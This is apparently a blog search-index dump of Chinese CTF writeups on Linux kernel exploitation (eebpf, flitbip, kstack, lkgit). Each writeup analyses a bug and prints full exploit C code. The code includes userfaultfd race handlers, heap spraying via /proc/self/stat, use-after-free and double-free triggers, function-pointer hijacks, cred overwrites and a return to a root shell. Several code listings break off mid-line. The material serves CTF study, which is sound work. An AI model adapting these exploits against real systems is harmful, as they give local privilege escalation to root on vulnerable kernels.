2020","uri":"/eebpf-tokyowesterns-ctf-2020/#aar"},{"categories":["Writeups"],"content":"AAW下面我们需要对cred进行覆盖，寻找合适的利用进行任意地址写。 static int array_map_get_next_key(struct bpf_map *map, void *key, void *next_key) { struct bpf_array *array = container_of(map, struct bpf_array, map); u32 index = key ? *(u32 *)key : U32_MAX; u32 *next = (u32 *)next_key; if (index \u003e= array-\u003emap.max_entries) { *next = 0; return 0; } if (index == array-\u003emap.max_entries - 1) return -ENOENT; *next = index + 1; return 0; } 上面的函数key和next_key由我们控制，可以将任意地址写入0或index+1。下面的函数的参数与这个函数几乎相同，可以帮助我们设置。 int bpf_map_push_elem(struct bpf_map *map, const void *value, u64 flags) 在flags填入目标地址，value填入目标值。我们可以设置array-\u003emap.max_entries为0xffffffff，这样就可以使目的地址值为0，同时扩大了我们可以写的值的范围。但是这个函数只有在map类型为BPF_MAP_TYPE_STACK or BPF_MAP_TYPE_QUEUE才会被调用，所以还要修改map的类型。 劫持map-\u003emap_ops到提前构造的虚表 修改map-\u003etype为BPF_MAP_TYPE_STACK 修改map-\u003emax_entries为0xffffffff 修改map-\u003espin_lock_off为0，以绕过其他的检查 在伪造的虚表中，bpf_map_push_elem指针需要被替换为array_map_get_next_key ","date":"2022-01-17","objectID":"/eebpf-tokyowesterns-ctf-2020/:4:0","series":null,"tags":["Writeups","Kernel"],"title":"eebpf-Tokyowesterns CTF 2020","uri":"/eebpf-tokyowesterns-ctf-2020/#aaw"},{"categories":["Writeups"],"content":"The full exp #define _GNU_SOURCE #include \u003clinux/bpf_common.h\u003e#include \u003cassert.h\u003e#include \u003cerr.h\u003e#include \u003cerrno.h\u003e#include \u003cfcntl.h\u003e#include \u003clinux/bpf.h\u003e#include \u003clinux/filter.h\u003e#include \u003clinux/userfaultfd.h\u003e#include \u003cmalloc.h\u003e#include \u003cnetinet/in.h\u003e#include \u003cpoll.h\u003e#include \u003cpthread.h\u003e#include \u003csched.h\u003e#include \u003csignal.h\u003e#include \u003cstdint.h\u003e#include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e#include \u003cstring.h\u003e#include \u003csys/ioctl.h\u003e#include \u003csys/ipc.h\u003e#include \u003csys/mman.h\u003e#include \u003csys/msg.h\u003e#include \u003csys/prctl.h\u003e#include \u003csys/shm.h\u003e#include \u003csys/socket.h\u003e#include \u003csys/syscall.h\u003e#include \u003csys/types.h\u003e#include \u003csys/uio.h\u003e#include \u003csys/xattr.h\u003e#include \u003cunistd.h\u003e#include \"bpf_insn.h\" #define PAGE_SIZE 4096 #define BPF_ALSH 0xe0 #define HELLO_MSG \"I am Niebelungen, let me in!\" #define MSG_LEN 28 void die(const char *msg) { perror(msg); exit(-1); } int global_fd; uint64_t kernbase; int read_map, write_map; int control_map; int reader_fd, reader_sock; int writer_fd, writer_sock; int _bpf(int cmd, union bpf_attr *attr, uint32_t size) { return syscall(__NR_bpf, cmd, attr, size); } int create_map(int value_size, int cnt) { int map_fd; union bpf_attr attr = {.map_type = BPF_MAP_TYPE_ARRAY, .key_size = 4, .value_size = value_size, .max_entries = cnt}; map_fd = _bpf(BPF_MAP_CREATE, \u0026attr, sizeof(attr)); if (map_fd \u003c 0) { die(\"[!] Error creating map\"); } printf(\"[+] created map: %d\\n\\tvalue size: %d\\n\\tcnt: %d\\n\", map_fd, value_size, cnt); return map_fd; } int prog_load(struct bpf_insn *prog, int insn_cnt) { int prog_fd; char log_buf[0xf000]; union bpf_attr attr = { .prog_type = BPF_PROG_TYPE_SOCKET_FILTER, .insn_cnt = insn_cnt, .insns = (uint64_t)prog, .license = (uint64_t) \"GPL\", .log_level = 2, .log_size = sizeof(log_buf), .log_buf = (uint64_t)log_buf, }; prog_fd = _bpf(BPF_PROG_LOAD, \u0026attr, sizeof(attr)); // printf(\"[+] log_buf: %s\\nLOG_END\\n\", log_buf); if (prog_fd \u003c 0) { die(\"[!] Failed to load BPF prog!\"); } return prog_fd; } int update_item(int fd, int idx, uint64_t value) { union bpf_attr attr = { .map_fd = fd, .key = (uint64_t)\u0026idx, .value = (uint64_t)\u0026value, .flags = BPF_ANY, }; // printf(\"[+] update_item;\\n\\tmap_fd: %d\\n\\tidx: 0x%x\\n\\tvalue: 0x%lx\\n\", fd, // idx, value); return _bpf(BPF_MAP_UPDATE_ELEM, \u0026attr, sizeof(attr)); } uint64_t get_item(int fd, uint64_t idx) { char value[0x800]; uint64_t index = idx; union bpf_attr *attr = calloc(1, sizeof(union bpf_attr)); attr-\u003emap_fd = fd; attr-\u003ekey = (uint64_t)\u0026idx; attr-\u003evalue = (uint64_t)value; if (_bpf(BPF_MAP_LOOKUP_ELEM, attr, sizeof(*attr)) \u003c 0) { die(\"[!] Failed to lookup\"); } return *(uint64_t *)value; } uint32_t READ32(uint64_t target) { update_item(control_map, 0, 0); update_item(control_map, 1, 1); update_item(control_map, 2, target - 0x58); if (send(reader_sock, HELLO_MSG, MSG_LEN, 0) \u003c 0) { die(\"[!] Failed to send HELLO_MSG\"); } struct bpf_map_info *info = calloc(1, sizeof(struct bpf_map_info)); union bpf_attr push_attr = { .info.bpf_fd = read_map, .info.info_len = sizeof(*info), .info.info = (uint64_t)info, }; if (_bpf(BPF_OBJ_GET_INFO_BY_FD, \u0026push_attr, sizeof(push_attr)) \u003c 0) { die(\"[!] Failed to get push\"); } return info-\u003ebtf_id; } uint64_t READ64(uint64_t target) { uint64_t low = READ32(target); uint64_t high = READ32(target + 4); return low + (high \u003c\u003c 32); } uint64_t leak_kernel() { int leak_fd; struct bpf_insn prog[] = { BPF_LD_MAP_FD(BPF_REG_1, control_map), // r1 = map_fd BPF_MOV64_IMM(BPF_REG_0, 0), // r0 = 0 BPF_MOV64_REG(BPF_REG_2, BPF_REG_10), // r2 = rbp BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8), // r2 = fp -8 BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 0), // key = [r2] = 0; BPF_ST_MEM(BPF_DW, BPF_REG_2, -8, 0), BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem), // r0 = lookup_elem BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1), // jmp if(r0!=NULL) BPF_EXIT_INSN(), // else exit BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_0, 0), // r6 = array[0] BPF_LD_MAP_FD(BPF_REG_1, control_map), // r1 = map_fd BPF_MOV64_IMM(BPF_REG_0, 0), // r0 = 0 BPF_MOV64_REG(BPF_REG_2, BPF_REG_10), // r2 = rbp BPF_ALU64_IMM(BPF_AD","date":"2022-01-17","objectID":"/eebpf-tokyowesterns-ctf-2020/:0:0","series":null,"tags":["Writeups","Kernel"],"title":"eebpf-Tokyowesterns CTF 2020","uri":"/eebpf-tokyowesterns-ctf-2020/#the-full-exp"},{"categories":["Writeups"],"content":"filpbit源码提供： #include \u003clinux/kernel.h\u003e#include \u003clinux/init.h\u003e#include \u003clinux/sched.h\u003e#include \u003clinux/syscalls.h\u003e #define MAXFLIT 1 #ifndef __NR_FLITBIP #define FLITBIP 333 #endif long flit_count = 0; EXPORT_SYMBOL(flit_count); SYSCALL_DEFINE2(flitbip, long *, addr, long, bit) { if (flit_count \u003e= MAXFLIT) { printk(KERN_INFO \"flitbip: sorry :/\\n\"); return -EPERM; } *addr ^= (1ULL \u003c\u003c (bit)); flit_count++; return 0; } 几乎没有开启任何的保护，通过自定义的系统调用修改指定的内存的数据。 题目逻辑是希望只能实现一次，而flit_count数据类型是long，如果将其最高位翻转，则可以达到修改任意次。 通过修改n_tty_ops的函数指针控制rip，控制执行流后需要修改当前进程的cred。通过读取current_task得到PCB，进而得到cred。 ","date":"2022-01-17","objectID":"/midnightsun2018-filpbit/:0:0","series":null,"tags":["Writeups","Kernel"],"title":"MidnightSun2018-filpbit","uri":"/midnightsun2018-filpbit/#filpbit"},{"categories":["Writeups"],"content":"The full exp #define _GNU_SOURCE #include \u003cassert.h\u003e#include \u003cerr.h\u003e#include \u003cerrno.h\u003e#include \u003cfcntl.h\u003e#include \u003clinux/bpf.h\u003e#include \u003clinux/filter.h\u003e#include \u003clinux/userfaultfd.h\u003e#include \u003cmalloc.h\u003e#include \u003cnetinet/in.h\u003e#include \u003cpoll.h\u003e#include \u003cpthread.h\u003e#include \u003csched.h\u003e#include \u003csignal.h\u003e#include \u003cstdint.h\u003e#include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e#include \u003cstring.h\u003e#include \u003csys/ioctl.h\u003e#include \u003csys/ipc.h\u003e#include \u003csys/mman.h\u003e#include \u003csys/msg.h\u003e#include \u003csys/prctl.h\u003e#include \u003csys/shm.h\u003e#include \u003csys/socket.h\u003e#include \u003csys/syscall.h\u003e#include \u003csys/types.h\u003e#include \u003csys/uio.h\u003e#include \u003csys/xattr.h\u003e#include \u003cunistd.h\u003e uint64_t *flit_count = (uint64_t *)0xffffffff818f4f78; uint64_t *n_tty_read = (uint64_t *)0xffffffff810c8510; uint64_t *n_tty_ops = (uint64_t *)0xffffffff8183e320; uint64_t *n_tty_ops_read = (uint64_t *)(0xffffffff8183e320 + 0x30); uint64_t *current_task = (uint64_t *)0xffffffff8182e040; void die(const char *msg) { fprintf(stderr, msg, strlen(msg), 0); exit(-1); } uint64_t user_cs, user_ss, user_rflags, user_sp; void save_status() { __asm__(\"mov %0, cs;\" \"mov %1, ss;\" \"mov %2, rsp;\" \"pushfq;\" \"popq %3;\" : \"=r\"(user_cs), \"=r\"(user_ss), \"=r\"(user_sp), \"=r\"(user_rflags) : : \"memory\"); puts(\"[*] status has been saved.\"); } void pop_shell() { if (!getuid()) { char *argv[] = {\"/bin/sh\", NULL}; char *envp[] = {NULL}; execve(\"/bin/sh\", argv, envp); puts(\"[*] Root!\"); } else { die(\"[!] spawn shell error!\\n\"); } } int __flit(void *addr, uint64_t bit) { __asm__(\"mov rax, 333;\" \"syscall;\"); } int flitbip(void *addr, uint64_t bit) { int ret = __flit(addr, bit); if (ret \u003c 0) { die(\"[!] flit failed\\n\"); } return ret; } void root() { uint64_t *cred = (uint64_t *)*(uint64_t *)((char *)*current_task + 0x3c0); memset(cred, 0, 28); *(uint64_t *)n_tty_ops_read = (uint64_t)n_tty_read; __asm__(\"swapgs;\" \"mov rax, %0;\" \"push rax;\" \"mov rax, %1;\" \"push rax;\" \"mov rax, %2;\" \"push rax;\" \"mov rax, %3;\" \"push rax;\" \"mov rax, %4;\" \"push rax;\" \"iretq;\" : : \"r\"(user_ss), \"r\"(user_sp), \"r\"(user_rflags), \"r\"(user_cs), \"r\"(pop_shell) : \"memory\"); } int main() { save_status(); flitbip(flit_count, 63); uint64_t flipper = (uint64_t)root ^ (uint64_t)n_tty_read; for (int i = 0; i \u003c 64; i++) { if ((flipper \u0026 1) == 1) flitbip(n_tty_ops_read, i); flipper \u003e\u003e= 1; } char buf; scanf(\"%c\", \u0026buf); return 0; } ","date":"2022-01-17","objectID":"/midnightsun2018-filpbit/:0:0","series":null,"tags":["Writeups","Kernel"],"title":"MidnightSun2018-filpbit","uri":"/midnightsun2018-filpbit/#the-full-exp"},{"categories":["Writeups"],"content":"Kstack这个题目同样提供了源码。 typedef struct _Element { int owner; unsigned long value; struct _Element *fd; } Element; Element *head = NULL; static long proc_ioctl(struct file *filp, unsigned int cmd, unsigned long arg) { Element *tmp, *prev; int pid = task_tgid_nr(current); switch (cmd) { case CMD_PUSH: tmp = kmalloc(sizeof(Element), GFP_KERNEL); tmp-\u003eowner = pid; tmp-\u003efd = head; head = tmp; if (copy_from_user((void *)\u0026tmp-\u003evalue, (void *)arg, sizeof(unsigned long))) { head = tmp-\u003efd; kfree(tmp); return -EINVAL; } break; case CMD_POP: for (tmp = head, prev = NULL; tmp != NULL; prev = tmp, tmp = tmp-\u003efd) { if (tmp-\u003eowner == pid) { if (copy_to_user((void *)arg, (void *)\u0026tmp-\u003evalue, sizeof(unsigned long))) return -EINVAL; if (prev) { prev-\u003efd = tmp-\u003efd; } else { head = tmp-\u003efd; } kfree(tmp); break; } if (tmp-\u003efd == NULL) return -EINVAL; } break; } return 0; } 它实现了一个链栈，head是栈顶。每个栈帧都与请求进程的pid绑定。很明显的漏洞是，head是一个全局变量，对其的任何操作都没有加锁。 ","date":"2022-01-17","objectID":"/seccon2020-kstack/:0:0","series":null,"tags":["Writeups","Kernel"],"title":"SECCON2020-kstack","uri":"/seccon2020-kstack/#kstack"},{"categories":["Writeups"],"content":"leak由于kaslr我们首先泄漏内核地址。现在已知push可以写内存，而pop可以读内存。通过条件竞争造成不一致情况，我们希望在copy_to_user时Element-\u003evalue的位置有内核地址。参考ptr-yudai师傅的博客：Kernel Exploitで使える構造体集。这里有两个结构可以选择: shm_file_data和seq_operations。我选择的是第一个。 首先创建一个共享内存，这时内核为进行申请了一个shm_file_data。然后，删除这个共享内存。内核会将shm_file_data给free掉。接着push，新建的Element就可以复用这块内存。在copy_from_user处触发 page fault 。此时Element-\u003evalue没有被修改，还保持着原来的值。在 userfaultfd 中，pop这个值到指定的位置。这样我们就泄漏了地址。 ","date":"2022-01-17","objectID":"/seccon2020-kstack/:1:0","series":null,"tags":["Writeups","Kernel"],"title":"SECCON2020-kstack","uri":"/seccon2020-kstack/#leak"},{"categories":["Writeups"],"content":"double free使用类似的手法，可以将同一个Element给pop两次，这样我们得到了两个相同大小的slab。其中一个通过open(\"/proc/self/stat\")分配给seq_operations。此结构体中包含对fd操作的各种内核函数指针。另一块通过setxttar分配，可以修改整个内存空间（setxttar可以修改很大的内存，可以用来堆喷），这里我们只要修改你要劫持的指针即可，我这里选择的是*next。 题目没有开启smap，可以通过gadget进行stack pivot，最后ROP实现提权。 ","date":"2022-01-17","objectID":"/seccon2020-kstack/:2:0","series":null,"tags":["Writeups","Kernel"],"title":"SECCON2020-kstack","uri":"/seccon2020-kstack/#double-free"},{"categories":["Writeups"],"content":"The full exp #define _GNU_SOURCE #include \u003cassert.h\u003e#include \u003cerr.h\u003e#include \u003cerrno.h\u003e#include \u003cfcntl.h\u003e#include \u003clinux/bpf.h\u003e#include \u003clinux/filter.h\u003e#include \u003clinux/userfaultfd.h\u003e#include \u003cmalloc.h\u003e#include \u003cnetinet/in.h\u003e#include \u003cpoll.h\u003e#include \u003cpthread.h\u003e#include \u003csched.h\u003e#include \u003csignal.h\u003e#include \u003cstdint.h\u003e#include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e#include \u003cstring.h\u003e#include \u003csys/ioctl.h\u003e#include \u003csys/ipc.h\u003e#include \u003csys/mman.h\u003e#include \u003csys/msg.h\u003e#include \u003csys/prctl.h\u003e#include \u003csys/shm.h\u003e#include \u003csys/socket.h\u003e#include \u003csys/syscall.h\u003e#include \u003csys/types.h\u003e#include \u003csys/uio.h\u003e#include \u003csys/xattr.h\u003e#include \u003cunistd.h\u003e #include \"./src/kstack.h\"#define PAGE_SIZE 4096 void die(const char *msg) { fprintf(stderr, msg, strlen(msg), 0); exit(-1); } int global_fd; int shmid; int fds[0x80]; int sfd; void *target = NULL; uint64_t kernbase; uint64_t modprobe_path; uint64_t user_cs, user_sp, user_ss, user_rflags; void push(uint64_t *value) { if (ioctl(global_fd, CMD_PUSH, value) \u003c 0) { die(\"[!] Failed to push\\n\"); } printf(\"[*] pushed --\u003e 0x%.8lx\\n\", *value); } void pop(uint64_t *value) { if (ioctl(global_fd, CMD_POP, value) \u003c 0) { die(\"[!] Failed to pop\\n\"); } printf(\"[*] poped --\u003e 0x%.8lx\\n\", *value); } void save_state() { __asm__(\".intel_syntax noprefix;\" \"mov user_cs, cs;\" \"mov user_ss, ss;\" \"mov user_sp, rsp;\" \"pushf;\" \"pop user_rflags;\" \".att_syntax;\"); puts(\"[*] Saved state\"); } void pop_shell() { char *argv1[] = {\"/bin/cat\", \"/flag\", NULL}; char *envp1[] = {NULL}; execve(\"/bin/cat\", argv1, envp1); char *envp[] = {NULL}; char *argv[] = {\"/bin/sh\", NULL}; execve(\"/bin/sh\", argv, envp); } static void fault_handler_thread(void *arg) { puts(\"[+] entered fault_handler_thread!\"); static struct uffd_msg msg; static int fault_cnt = 0; struct uffdio_copy uc; uint64_t uffd = (uint64_t)arg; struct pollfd pollfd; int nready; void *value = NULL; pollfd.fd = uffd; pollfd.events = POLLIN; puts(\"[+] polling...\"); while ((nready = poll(\u0026pollfd, 1, -1)) \u003e 0) { if (pollfd.revents \u0026 POLLERR || pollfd.revents \u0026 POLLHUP) { die(\"[!] poll failed\\n\"); } if ((read(uffd, \u0026msg, sizeof(msg))) == 0) { die(\"[!] read uffd msg failed\\n\"); } if (msg.event != UFFD_EVENT_PAGEFAULT) { die(\"[!] unexpected pagefault\\n\"); } if (fault_cnt++ == 0) { value = mmap(0, PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0); strcpy(value, \"AAAAAAAA\\x00\"); printf(\"[+] page fault: %p\\n\", (void *)msg.arg.pagefault.address); pop(value); puts(\"[+] heap spray...\"); for (int i = 0; i \u003c 0x80; i++) { fds[i] = open(\"/proc/self/stat\", O_RDONLY); } uc.src = (unsigned long)value; } else { value = mmap(0, PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0); strcpy(value, \"AAAAAAAA\\x00\"); printf(\"[+] page fault: %p\\n\", (void *)msg.arg.pagefault.address); pop(value); puts(\"[+] double free\"); uc.src = (unsigned long)value; } uc.len = PAGE_SIZE; uc.dst = (unsigned long)msg.arg.pagefault.address \u0026 ~(PAGE_SIZE - 1); uc.mode = 0; uc.copy = 0; if (ioctl(uffd, UFFDIO_COPY, \u0026uc) == -1) { die(\"[!] ioctl-UFFDIO_COPY\"); } break; } puts(\"[+] exit fault_handler_thread!\"); } void RegisterUserfault(void *fault_page, void *handler) { pthread_t phr; struct uffdio_api ua; struct uffdio_register ur; uint64_t uufd; int s; uufd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK); if (uufd \u003c 0) { die(\"[!] Failed to register userfaultfd\\n\"); } ua.api = UFFD_API; ua.features = 0; if (ioctl(uufd, UFFDIO_API, \u0026ua) == -1) { die(\"[!] Failed ioctl UFFDIO_API\\n\"); } ur.range.start = (unsigned long)fault_page; ur.range.len = PAGE_SIZE; ur.mode = UFFDIO_REGISTER_MODE_MISSING; if (ioctl(uufd, UFFDIO_REGISTER, \u0026ur) == -1) { die(\"[!] Failed ioctl UFFDIO_REGISTER\\n\"); } s = pthread_create(\u0026phr, NULL, handler, (void *)uufd); if (s != 0) { die(\"[!] Failed pthread_create\\n\"); } } // create a share memory --\u003e free it --\u003e push --\u003e page fault --\u003e pop --\u003e leaks // void createShareMemory() { if ((shmid = shmget((key_t)0xdead, PAGE_SIZE, 0640 | IPC_CREAT)) == -1) { die(\"[!] Fai","date":"2022-01-17","objectID":"/seccon2020-kstack/:0:0","series":null,"tags":["Writeups","Kernel"],"title":"SECCON2020-kstack","uri":"/seccon2020-kstack/#the-full-exp"},{"categories":["Writeups"],"content":"userfaultfduserfaultfd，这是 kernel 中提供的一种特殊的处理 page fault 的机制，能够让用户态程序自行处理自己的 page fault. 它的调用方式是通过一个 userfaultfd 的 syscall 新建一个 fd，然后用 ioctl 等 syscall 来调用相关的API. 该机制的初衷是为了方便虚拟机的 live migration，其功能还处在不断改进和发展中，文档和资料都不是很多。 ","date":"2022-01-17","objectID":"/tsgctf2021-lkgit-userfaultfd/:0:0","series":null,"tags":["Writeups","Kernel"],"title":"TSGCTF2021-lkgit(userfaultfd)","uri":"/tsgctf2021-lkgit-userfaultfd/#userfaultfd"},{"categories":["Writeups"],"content":"工作流程和用法","date":"2022-01-17","objectID":"/tsgctf2021-lkgit-userfaultfd/:1:0","series":null,"tags":["Writeups","Kernel"],"title":"TSGCTF2021-lkgit(userfaultfd)","uri":"/tsgctf2021-lkgit-userfaultfd/#工作流程和用法"},{"categories":["Writeups"],"content":"分配一个userfault fd 并检查 API /* Create and enable userfaultfd object */ uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK); if (uffd == -1) errExit(\"userfaultfd\"); uffdio_api.api = UFFD_API; uffdio_api.features = 0; if (ioctl(uffd, UFFDIO_API, \u0026uffdio_api) == -1) errExit(\"ioctl-UFFDIO_API\"); ","date":"2022-01-17","objectID":"/tsgctf2021-lkgit-userfaultfd/:1:1","series":null,"tags":["Writeups","Kernel"],"title":"TSGCTF2021-lkgit(userfaultfd)","uri":"/tsgctf2021-lkgit-userfaultfd/#分配一个userfault-fd-并检查-api"},{"categories":["Writeups"],"content":"注册需要进行 userfault 的内存区域 /* Register the memory range of the mapping we just created for handling by the userfaultfd object. In mode, we request to track missing pages (i.e., pages that have not yet been faulted in). */ uffdio_register.range.start = (unsigned long) addr; uffdio_register.range.len = len; uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING; if (ioctl(uffd, UFFDIO_REGISTER, \u0026uffdio_register) == -1) errExit(\"ioctl-UFFDIO_REGISTER\"); ","date":"2022-01-17","objectID":"/tsgctf2021-lkgit-userfaultfd/:1:2","series":null,"tags":["Writeups","Kernel"],"title":"TSGCTF2021-lkgit(userfaultfd)","uri":"/tsgctf2021-lkgit-userfaultfd/#注册需要进行-userfault-的内存区域"},{"categories":["Writeups"],"content":"创建 monitor 线程监听 fd 的事件（）在一个 for 循环中，不断使用 pool 来等待这个 fd ，然后读取一个 msg，这里读取的 msg 就是 uffd_msg 结构。 for (;;) { /* See what poll() tells us about the userfaultfd */ struct pollfd pollfd; int nready; pollfd.fd = uffd; pollfd.events = POLLIN; nready = poll(\u0026pollfd, 1, -1); if (nready == -1) errExit(\"poll\"); printf(\"\\nfault_handler_thread():\\n\"); printf(\" poll() returns: nready = %d; \" \"POLLIN = %d; POLLERR = %d\\n\", nready, (pollfd.revents \u0026 POLLIN) != 0, (pollfd.revents \u0026 POLLERR) != 0); /* Read an event from the userfaultfd */ nread = read(uffd, \u0026msg, sizeof(msg)); if (nread == 0) { printf(\"EOF on userfaultfd!\\n\"); exit(EXIT_FAILURE); } if (nread == -1) errExit(\"read\"); ","date":"2022-01-17","objectID":"/tsgctf2021-lkgit-userfaultfd/:1:3","series":null,"tags":["Writeups","Kernel"],"title":"TSGCTF2021-lkgit(userfaultfd)","uri":"/tsgctf2021-lkgit-userfaultfd/#创建-monitor-线程监听-fd-的事件"},{"categories":["Writeups"],"content":"主线程出发指定区域的 page fault访问该区域的内存即可 ","date":"2022-01-17","objectID":"/tsgctf2021-lkgit-userfaultfd/:1:4","series":null,"tags":["Writeups","Kernel"],"title":"TSGCTF2021-lkgit(userfaultfd)","uri":"/tsgctf2021-lkgit-userfaultfd/#主线程出发指定区域的-page-fault"},{"categories":["Writeups"],"content":"自线程处理 fault调用 UFFDIO_COPY 为新映射的页提供数据，并唤醒主线程，子线程自身会进入到下一轮循环中继续 poll 等待输入 /* Copy the page pointed to by 'page' into the faulting region. Vary the contents that are copied in, so that it is more obvious that each fault is handled separately. */ memset(page, 'A' + fault_cnt % 20, page_size); fault_cnt++; uffdio_copy.src = (unsigned long) page; /* We need to handle page faults in units of pages(!). So, round faulting address down to page boundary */ uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address \u0026 ~(page_size - 1); uffdio_copy.len = page_size; uffdio_copy.mode = 0; uffdio_copy.copy = 0; if (ioctl(uffd, UFFDIO_COPY, \u0026uffdio_copy) == -1) errExit(\"ioctl-UFFDIO_COPY\"); 在处理userfaultfd的时，触发 page fault 的进程被阻塞，执行我们的处理程序。这样可以提高条件竞争的几率。 ","date":"2022-01-17","objectID":"/tsgctf2021-lkgit-userfaultfd/:1:5","series":null,"tags":["Writeups","Kernel"],"title":"TSGCTF2021-lkgit(userfaultfd)","uri":"/tsgctf2021-lkgit-userfaultfd/#自线程处理-fault"},{"categories":["Writeups"],"content":"Challenge: lkgit这是一道kernel pwn使用了很标准的 userfaultfd 来为条件竞争创造条件。来自TSGCTF2021。关于条件竞争这里就不再赘述了。 国外的比赛大都提供了源代码（Nice！） lkgit在linux 内核中模仿了一个git。用户提交 content 和 msg，内核返回 content 的哈希。通过 hash 来定位一个对象，进行查/改。如果新提交的对象的 hash 与旧的相同，则旧的对象会被free。 它通过一个全局变量数组来维护所有的对象，但每个对全局变量的操作都没有加锁。这表明我们可以达成 UAF。 由于开启了KASLR，所以需要先泄漏内核的地址。在lkgit_get_object中有四次与用户态数据的交互。第一次，用户req-\u003ehash，取出对应的对象。将conent返回用户req-\u003econtent接着检查了content与hash是否对应。之后将message和hash返回。 static long lkgit_get_object(log_object *req) { long ret = -LKGIT_ERR_OBJECT_NOTFOUND; char hash_other[HASH_SIZE] = {0}; char hash[HASH_SIZE]; int target_ix; hash_object *target; if (copy_from_user(hash, req-\u003ehash, HASH_SIZE)) goto end; if ((target_ix = find_by_hash(hash)) != -1) { target = objects[target_ix]; if (copy_to_user(req-\u003econtent, target-\u003econtent, FILE_MAXSZ)) // 0x40 goto end; // validity check of hash get_hash(target-\u003econtent, hash_other); if (memcmp(hash, hash_other, HASH_SIZE) != 0) goto end; if (copy_to_user(req-\u003emessage, target-\u003emessage, MESSAGE_MAXSZ)) goto end; if (copy_to_user(req-\u003ehash, target-\u003ehash, HASH_SIZE)) goto end; ret = 0; } end: return ret; } 我们必须保证检查hash的正确性，所以要在copy_to_user(req-\u003emessage)时，将这个对象free。free之后这个内存object中会包含内核地址信息，从而leak kernbase。下面是一个思路（来自Kileak）： request object || || \\/ lkgit_get_object || || \\/ find_by_hash || || \\/ copy_to_user(content) || || \\/ copy_to_user(message) || || (page fault) ||==============================\u003e userfaulthandler (break on read) || || \\/ delete current object || || \\/ heap spray || || ||\u003c============================================ || || \\/ copy_to_user(hash) 一个触发脚本。 #define _GNU_SOURCE #include \u003cstring.h\u003e#include \u003cstdio.h\u003e#include \u003cfcntl.h\u003e#include \u003cstdint.h\u003e#include \u003cunistd.h\u003e#include \u003cassert.h\u003e#include \u003cstdlib.h\u003e#include \u003csignal.h\u003e#include \u003cpoll.h\u003e#include \u003cpthread.h\u003e#include \u003cerr.h\u003e#include \u003cerrno.h\u003e#include \u003cnetinet/in.h\u003e#include \u003csched.h\u003e#include \u003clinux/bpf.h\u003e#include \u003clinux/filter.h\u003e#include \u003clinux/userfaultfd.h\u003e#include \u003csys/syscall.h\u003e#include \u003csys/ipc.h\u003e#include \u003csys/msg.h\u003e#include \u003csys/prctl.h\u003e#include \u003csys/ioctl.h\u003e#include \u003csys/mman.h\u003e#include \u003csys/types.h\u003e#include \u003csys/xattr.h\u003e#include \u003csys/socket.h\u003e#include \u003csys/uio.h\u003e#include \u003csys/shm.h\u003e#include \u003cmalloc.h\u003e #include \"./src/include/lkgit.h\" #define PAGE_SIZE 4096 void die(const char *msg) { fprintf(stderr,msg,strlen(msg),0); exit(-1); } int global_fd; int fds[0x80]; void *basepage = NULL; uint64_t kernbase = 0; uint64_t modprobe_path = 0; hash_object *req1 = NULL; log_object *req2 = NULL; static void fault_handler_thread(void *arg) { puts(\"[+] entered fault_handler_thread!\"); static struct uffd_msg msg; struct uffdio_copy uc; uint64_t uffd = (uint64_t)arg; struct pollfd pollfd; int nready; pollfd.fd = uffd; pollfd.events = POLLIN; puts(\"[+] polling...\"); while ((nready = poll(\u0026pollfd, 1, -1)) \u003e 0) { if (pollfd.revents \u0026 POLLERR || pollfd.revents \u0026 POLLHUP) { die(\"[!] poll failed\\n\"); } if ((read(uffd, \u0026msg, sizeof(msg))) == 0) { die(\"[!] read uffd msg failed\\n\"); } if (msg.event != UFFD_EVENT_PAGEFAULT) { die(\"[!] unexpected pagefault\\n\"); } printf(\"[+] page fault: %p\\n\", (void *)msg.arg.pagefault.address); puts(\"[+] Now free this object\"); ioctl(global_fd, LKGIT_HASH_OBJECT, req1); puts(\"[+] heap spray...\"); for (int i = 0; i \u003c 0x80; i++) { fds[i] = open(\"/proc/self/stat\", O_RDONLY); } uc.src = (unsigned long)basepage; uc.len = PAGE_SIZE; uc.dst = (unsigned long)msg.arg.pagefault.address \u0026 ~(PAGE_SIZE - 1); uc.mode = 0; uc.copy = 0; if (ioctl(uffd, UFFDIO_COPY, \u0026uc) == -1) { die(\"[!] ioctl-UFFDIO_COPY\"); } break; } puts(\"[+] exit fault_handler_thread!\"); } void RegisterUserfault(void *fault_page,void *handler) { pthread_t phr; struct uffdio_api ua; struct uffdio_register ur; uint64_t uufd; int s; uufd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK); if (uufd \u003c 0) { die(\"[!] Failed to register userfaultfd\\n\"); } ua.api = UFFD_API; ua.features = 0; if (ioctl(uufd, UFFDIO_API, \u0026ua) == -1) { die(\"[!] Failed ioctl UFFDIO_API\\n\"); } ur.range.start = (unsigned long) fault_page; ur.rang","date":"2022-01-17","objectID":"/tsgctf2021-lkgit-userfaultfd/:0:0","series":null,"tags":["Writeups","Kernel"],"title":"TSGCTF2021-lkgit(userfaultfd)","uri":"/tsgctf2021-lkgit-userfaultfd/#challenge-lkgit"},{"categories":["Writeups"],"content":"The full exp #define _GNU_SOURCE #include \u003cstring.h\u003e#include \u003cstdio.h\u003e#include \u003cfcntl.h\u003e#include \u003cstdint.h\u003e#include \u003cunistd.h\u003e#include \u003cassert.h\u003e#include \u003cstdlib.h\u003e#include \u003csignal.h\u003e#include \u003cpoll.h\u003e#include \u003cpthread.h\u003e#include \u003cerr.h\u003e#include \u003cerrno.h\u003e#include \u003cnetinet/in.h\u003e#include \u003csched.h\u003e#include \u003clinux/bpf.h\u003e#include \u003clinux/filter.h\u003e#include \u003clinux/userfaultfd.h\u003e#include \u003csys/syscall.h\u003e#include \u003csys/ipc.h\u003e#include \u003csys/msg.h\u003e#include \u003csys/prctl.h\u003e#include 